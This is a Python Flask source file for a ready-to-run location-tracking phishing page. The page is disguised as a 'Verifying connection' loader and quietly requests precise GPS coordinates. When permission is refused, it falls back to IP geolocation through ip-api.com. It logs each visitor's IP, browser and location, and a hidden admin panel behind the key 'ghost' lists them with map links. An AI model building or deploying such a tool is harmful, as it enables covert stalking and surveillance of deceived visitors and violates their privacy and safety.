from flask import Flask, request, render_template_string
import json, time, os, requests

app = Flask(__name__)
LOG = "hits.jsonl"

PAGE = """
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0d1117;color:#e6edf3;font-family:sans-serif;text-align:center}
.ring{width:64px;height:64px;border:4px solid #21262d;border-top-color:#58a6ff;border-radius:50%;margin:0 auto 24px;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:20px;margin:0 0 8px}p{color:#8b949e;font-size:14px}
.ok{color:#3fb950}
</style></head><body><div>
<div class="ring" id="r"></div>
<h1 id="t">Verifying connection</h1>
<p id="s">Please wait, this only takes a moment.</p>
</div>
<script>
const t=document.getElementById('t'),s=document.getElementById('s'),r=document.getElementById('r');
function done(msg){r.style.borderColor='#3fb950';r.style.animation='none';r.style.borderTopColor='#3fb950';t.textContent='Connection verified';t.className='ok';s.textContent=msg||'You may close this page.';}
function send(d){fetch('/c',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(()=>{});}
function geo(){if(!navigator.geolocation) return fail('no_geo');navigator.geolocation.getCurrentPosition(p=>{send({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,src:'gps'});done();},e=>fail(e.code===1?'denied':'unavailable'),{enableHighAccuracy:true,timeout:10000,maximumAge:0});}
function fail(r){send({src:'ip',reason:r});done();}
setTimeout(()=>{if(!document.hidden)geo();},1200);
</script></body></html>
"""

@app.route("/")
def index(): return render_template_string(PAGE)

@app.route("/c", methods=["POST"])
def collect():
    d = request.get_json(silent=True) or {}
    ip = (request.headers.get("X-Forwarded-For","") or request.remote_addr or "").split(",")[0].strip()
    rec = {"ts": int(time.time()), "ip": ip, "ua": request.headers.get("User-Agent",""), "lat": d.get("lat"), "lon": d.get("lon"), "acc": d.get("acc"), "src": d.get("src"), "reason": d.get("reason")}
    if not rec["lat"] and ip:
        try:
            g = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country,isp", timeout=5).json()
            if g.get("status") == "success": rec.update({"lat": g["lat"], "lon": g["lon"], "city": g.get("city"), "country": g.get("country"), "isp": g.get("isp")})
        except: pass
    with open(LOG, "a") as f: f.write(json.dumps(rec) + "\n")
    print("HIT:", rec)
    return ("", 204)

@app.route("/admin")
def admin():
    if request.args.get("key","") != "ghost": return "not found", 404
    rows = []
    if os.path.exists(LOG):
        with open(LOG) as f: rows = [json.loads(l) for l in f if l.strip()][::-1]
    out = ["<html><meta charset='utf-8'><body style='background:#0d1117;color:#e6edf3;font-family:monospace;padding:20px'><h2 style='color:#58a6ff'>Hits</h2><table border=1 cellpadding=6 style='border-collapse:collapse;font-size:13px'><tr><th>time</th><th>src</th><th>map</th><th>ip</th><th>city</th><th>ua</th></tr>"]
    for r in rows:
        mp = f"<a target='_blank' href='https://maps.google.com/?q={r['lat']},{r['lon']}'>map</a>" if r.get("lat") else "—"
        t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
        out.append(f"<tr><td>{t}</td><td>{r.get('src','?')}</td><td>{mp}</td><td>{r['ip']}</td><td>{r.get('city','')}/{r.get('country','')}</td><td>{r['ua'][:50]}</td></tr>")
    out.append("</table></body></html>")
    return "".join(out)

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
